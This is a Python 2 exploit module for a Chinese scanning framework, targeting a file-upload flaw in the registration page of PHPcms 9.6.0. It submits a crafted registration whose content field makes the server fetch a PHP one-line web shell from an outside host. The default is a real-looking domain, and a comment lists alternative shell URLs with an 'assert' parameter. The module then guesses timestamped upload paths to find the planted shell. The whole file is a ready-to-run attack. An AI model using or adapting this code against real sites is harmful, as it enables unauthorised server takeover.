#! /usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
from thirdpart import requests
from datetime import datetime
#模块使用说明
docs = '''

#title                  :PHPcms9.6.0上传漏洞
#description            :PHPcms9.6.0注册处存在上传漏洞
#author                 :mosin
#date                   :20171009
#version                :0.1
#notes                  :
#python_version         :2.7.5

'''

from modules.exploit import BGExploit



class PLScan(BGExploit):
    
    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "PHPcms9.6.0上传漏洞",  # 该POC的名称
            "product": "PHPcms9.6.0上传漏洞",  # 该POC所针对的应用名称,
            "product_version": "9.6.0",  # 应用的版本号
            "desc": '''
                PHPcms9.6.0存在注册上传漏洞
            ''',  # 该POC的描述
            "author": ["mosin"],  # 编写POC者
            "ref": [
                {self.ref.url: ""},  # 引用的url
                {self.ref.bugfrom: ""},  # 漏洞出处
            ],
            "type": self.type.file_upload,  # 漏洞类型
            "severity": self.severity.high,  # 漏洞等级
            "privileged": False,  # 是否需要登录
            "disclosure_date": "2017-05-17",  # 漏洞公开时间
            "create_date": "2017-10-9",  # POC 创建时间
        }

        #自定义显示参数
        self.register_option({
            "target": {
                "default": "",
                "convert": self.convert.url_field,
                "desc": "目标URL",
                "Required":"no"
            },
            "port": {
                "default": "",
                "convert": self.convert.int_field,
                "desc": "目标端口",
                "Required":""
            },
            "debug": {
                "default": "",
                "convert": self.convert.str_field,
                "desc": "用于调试，排查poc中的问题",
                "Required":""
            },
            "mode": {
                "default": "payload",
                "convert": self.convert.str_field,
                "desc": "执行exploit,或者执行payload",
                "Required":"no"
            },
            "content": {
                "default": "http://www.cefcchina.com:7001/php.txt",
                "convert": self.convert.str_field,
                "desc": "回调shell地址",
                "Required":"no"
            }
        })
        
        #自定义返回内容
        self.register_result({
            #检测标志位，成功返回置为True,失败返回False
            "status": False,
            "exp_status":False, #exploit，攻击标志位，成功返回置为True,失败返回False
            #定义返回的数据，用于打印获取到的信息
            "data": {
                
            },
            #程序返回信息
            "description": "",
            "error": "Request Error",
            "infos":{
                "statu_info":"[-] Notice : writing remoteShell successfully, but failing to get the echo. You can wait the program crawl the uploadfile(in 1-3 second)，or re-run the program after modifying value of username and email.\n",
                "faile_info":"[-] Failed : had crawled all possible url, but i can't find out it. So it's failed.\n"
            }
        })

    def getTime(self):
        year = str(datetime.now().year)
        month = "%02d" % datetime.now().month
        day = "%02d" % datetime.now().day
        hour = datetime.now().hour
        hour = hour - 12 if hour > 12 else hour
        hour = "%02d" % hour
        minute = "%02d" % datetime.now().minute
        second = "%02d" % datetime.now().second
        microsecond = "%06d" % datetime.now().microsecond
        microsecond = microsecond[:3]
        nowTime = year + month + day + hour + minute + second + microsecond
        return int(nowTime), year + "/" + month + day + "/"

    def payload(self):
        host = self.option.target['default']
        url = host + "/index.php?m=member&c=index&a=register&siteid=1"
        contents = "<img src=" + self.options.content['default'] + ">"
        data = {
            "siteid": "1",
            "modelid": "1",
            "username": "dsakkfaffdssdudi",
            "password": "123456",
            "email": "dsakkfddsjdi@qq.com",
            # 如果想使用回调的可以使用http://file.codecat.one/oneword.txt，一句话地址为.php后面加上e=YXNzZXJ0
            "info[content]": contents,
            #"info[content]": "<img src=http://file.codecat.one/normalOneWord.txt?.php#.jpg>",
            "dosubmit": "1",
            "protocol": "",
        }
        try:
            startTime, _ = self.getTime()
            htmlContent = requests.post(url, data=data)
            finishTime, dateUrl = self.getTime()
            if "MySQL Error" in htmlContent.text and "http" in htmlContent.text:
                successUrl = htmlContent.text[htmlContent.text.index("http"):htmlContent.text.index(".php")] + ".php"
                self.result.description = "shell: " + successUrl
                self.result.status = True
            else:
                print self.result.infos['statu_info']
                successUrl = ""
                for t in range(startTime, finishTime):
                    checkUrlHtml = requests.get(host + "/uploadfile/" + dateUrl + str(t) + ".php")
                    if checkUrlHtml.status_code == 200:
                        successUrl = host + "/uploadfile/" + dateUrl + str(t) + ".php"
                        self.result.description = "shell: " + successUrl
                        self.result.status = True
                        break
                if successUrl == "":
                    print self.result.infos['faile_info']
        except:
            print self.result.error
            
    def exploit(self):
        """
        攻击类型
        :return:
        """
        pass


#下面为单框架程序执行，可以省略
if __name__ == '__main__':
    from main import main
    main(PLScan())